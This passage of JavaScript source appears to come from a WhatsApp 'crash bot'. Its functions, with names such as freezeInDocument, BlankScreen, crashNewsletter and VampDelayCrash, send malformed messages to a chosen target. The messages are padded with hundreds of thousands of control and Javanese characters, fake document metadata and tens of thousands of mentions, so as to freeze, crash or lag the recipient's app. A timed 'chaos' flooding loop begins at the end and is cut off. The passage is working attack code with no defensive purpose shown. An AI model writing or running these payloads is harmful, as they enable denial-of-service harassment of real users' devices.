                        mediaKeyTimestamp: "1715880173",
                        contactVcard: true
                    },
                    title: "Mikasa",
                    hasMediaAttachment: true
                },
                body: {
                    text: "𝐒𝐮𝐤𝐚 𝐍𝐞𝐧𝐞𝐧"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        }
                    ]
                },
                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: { 
                                text: "Sent", 
                                format: "DEFAULT" 
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "Mikasa Official",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "Mikasa@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                    "screen_0_TextInput_1": "Why?",
                                    "screen_0_Dropdown_2": "001-Grimgar",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }
}, { participant: { jid: target } }, { messageId: null });
}

async function kamuflaseFreeze(Mikasa, target) {
    let messagePayload = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {},
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "𝐌𝐮𝐥𝐮𝐭 𝐋𝐮 𝐁𝐚𝐮 𝐒𝐞𝐛𝐥𝐚𝐤..."
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "review_and_pay",
                                buttonParamsJson: JSON.stringify({
                                    currency: "IDR",
                                    total_amount: { value: 6100, offset: 100 },
                                    reference_id: "4Q79X9PCBEM",
                                    type: "physical-goods",
                                    order: {
                                        status: "completed",
                                        subtotal: { value: 0, offset: 100 },
                                        order_type: "PAYMENT_REQUEST",
                                        items: [
                                            {
                                                retailer_id: "custom-item-7fca9870-8e3a-4a4a-bfb7-8a07fbf5fa9e",
                                                name: "@1".repeat(70000),
                                                amount: { value: 6100, offset: 100 },
                                                quantity: 1
                                            }
                                        ]
                                    },
                                    additional_note: "Mikasa",
                                    native_payment_methods: [],
                                    share_payment_status: false
                                })
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [
                            {
                                groupJid: "1@newsletter",
                                groupSubject: "Vampire"
                            }
                        ],
                        isForwarded: true,
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "Sent",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: `{
                                        "screen_2_OptIn_0": true,
                                        "screen_2_OptIn_1": true,
                                        "screen_1_Dropdown_0": "Mikasa",
                                        "screen_1_DatePicker_1": "1028995200000",
                                        "screen_1_TextInput_2": "Mikasa@gmail.com",
                                        "screen_1_TextInput_3": "94643116",
                                        "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(900000)}",
                                        "screen_0_TextInput_1": "Why?",
                                        "screen_0_Dropdown_2": "001-Grimgar",
                                        "screen_0_RadioButtonsGroup_3": "0_true",
                                        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                    }`,
                                    version: 3
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    Mikasa.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function systemUi(Mikasa, target) {
    Mikasa.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Halo Mas... Saya Mikasa" + "ꦾ".repeat(250000) + "@1".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Mikasa" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
};


async function program(Mikasa, target) {
    Mikasa.relayMessage(target, {
  "eventMessage": {
    "isCanceled": false,
    "name": "Kicau Mania",
    "description": "Kicau Bersama Si imut",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0
    },
    "joinLink": "https://call.whatsapp.com/video/vfRMCdSTKA6pFooMqGILjZ",
    "startTime": "1732946400"
  }
},
        {}
    );
};

async function freezeInDocument(Mikasa, target) {
    Mikasa.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                        fileLength: "1991837291999",
                        pageCount: 199183729199991,
                        mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                        fileName: "Mikasa Attack",
                        fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                        directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1728631701",
                        contactVcard: true,
                        caption: "゙゙゙゙゙゙".repeat(100) + "@1".repeat(90000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "vamp" }],
                            isForwarded: true,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: { 
                                        text: "Sent", 
                                        format: "DEFAULT" 
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "galaxy_message",
                                        paramsJson: `{
                                            "screen_2_OptIn_0": true,
                                            "screen_2_OptIn_1": true,
                                            "screen_1_Dropdown_0": "Mikasa",
                                            "screen_1_DatePicker_1": "1028995200000",
                                            "screen_1_TextInput_2": "Mikasa@gmail.com",
                                            "screen_1_TextInput_3": "94643116",
                                            "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(700000)}",
                                            "screen_0_TextInput_1": "Why?",
                                            "screen_0_Dropdown_2": "001-Grimgar",
                                            "screen_0_RadioButtonsGroup_3": "0_true",
                                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                        version: 3
                                    },
                                }
                            }
                        }
                    }
                }
            }
        },
        { participant: { jid: target } }
    );
}

async function LocationUi(Mikasa, target) {
                   await Mikasa.relayMessage(target, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           locationMessage: {
                                                                   degreesLatitude: 111,
                                                                   degreesLongitude: 111
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0003" + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "Mikasa"
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "120363404154098043@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "120363404154098043@newsletter",
                                                                   groupSubject: "Mikasa"
                                                           }],
                                                           quotedMessage: {
                                                                   documentMessage: {
                                                                           contactVcard: true
                                                                   }
                                                           }
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: target
                           }
                   });
           }
           async function DocumentUi(Mikasa, target) {
                   await Mikasa.relayMessage(target, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           documentMessage: {
                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                                                   mimetype: "application/pdf",
                                                                   fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                                                   fileLength: "1099511627776",
                                                                   pageCount: 199183729199991,
                                                                   mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                                                   fileName: "Open VCS",
                                                                   fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                                                   directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                                                   mediaKeyTimestamp: "1728631701",
                                                                   contactVcard: true
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0003" + "ꦿꦸ".repeat(1) + "@1".repeat(1),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "Open VCS",
                                                           "buttons": [{
                                                                   "name": "review_and_pay",
                                                                   "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":2000000,\"offset\":100},\"reference_id\":\"4R0F79457Q7\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de\",\"name\":\"sksksksksksksks\",\"amount\":{\"value\":2000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"sksksksksksksks\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                                                           }]
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "120363404154098043@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "120363404154098043@newsletter",
                                                                   groupSubject: "Open VCS"
                                                           }]
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: target
                           }
                   });
           }
           


async function BlankNotific(target) {
   await Mikasa.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "\u0003",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "Mikasa" + "\u0003" + "ꦽ".repeat(120000),
        },
        nativeFlowMessage: {
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["628888888888@s.whatsapp.net", ...Array.from({
          length: 10000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "\u0003",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    {
     participant: {
      jid: target
     }
    }
   );
  }

async function AxnForceClose(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "‌kepFoЯannas",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await Mikasa.relayMessage(target, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function blanks(target) {
    await Mikasa.relayMessage(
        target,
        {
            document: "null",
            fileName: "qw",
            caption: "One Click Crash",
            footer: "@Alpooooooofoluv",
            buttons: [
                {
                    buttonId: "X",
                    buttonText: {
                        displayText: "One Click Crash" + "\u0003".repeat(99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)
                    },
                    type: 1,
                },
            ],
            headerType: 1,
        },
        {
            quoted: m
        }
    );
}

async function crashNewsletter(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      header: {
      documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
       fileLength: "9999999999999",
       pageCount: 9999999999999,
       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
       fileName: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mediaKeyTimestamp: 1735456100,
       contactVcard: true,
       caption: "F*ucking Everyone"
      }
     },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: "trigger",
              order: {
                status: "flex_agency",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: "ꦽ".repeat(10000) 
      }
   }
  }, { userJid: target });

  await Mikasa.relayMessage(target, msg.message, { 
    participant: { jid: target },
    messageId: msg.key.id 
  });
}

const VampireKING = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"shibalDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Vampire&devorsixcore@shibal.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u200e".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };

      async function BlankScreen(target, Ptcp = false) {
        let virtex = "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv" + "\u0003".repeat(90000);
			await Mikasa.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "vampXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : { quoted: VampireKING }
			);
       }
       
async function VampDelayCrash(Mikasa, target) {
    const Vampire = "_*~@15056662003~*_\n".repeat(10200);
    const Lalapo = "ꦽ".repeat(1500);

    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv" + Lalapo + Vampire
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await Mikasa.relayMessage(target, message, { participant: { jid: target } });
}

async function VampNewAttack(target, Ptcp = false) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv" + "ꦾ".repeat(90000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ ×Alpooooooofoluv"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "I Love U Strangers"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await Mikasa.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
        }

// FUNC DELAY

async function KeJaaDelayInvis(target, mention = false, durationHours = 2) {
  const duration = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  
  const CHAOS_CHARS = [
    '\u200B', 
    '\uDB40\uDD00', 
    '\uFFFC', 
    '\u0008',
    '\u202E',
    '\uD83D\uDCA9', 
    '\uFEFF', 
    '\u0003', 
    '\uDBFF\uDFFF' 
  ];
  
  const generateChaosString = (length) => {
    let result = '';
    for (let i = 0; i < length; i++) {
      if (i % 100 === 0) result += `\u200B${Math.random().toString(36).substring(2, 15)}\u202E`;
      else if (i % 50 === 0) result += `\u0003\uDBFF\uDFFF${Math.random().toString(36).substring(2, 7)}`;
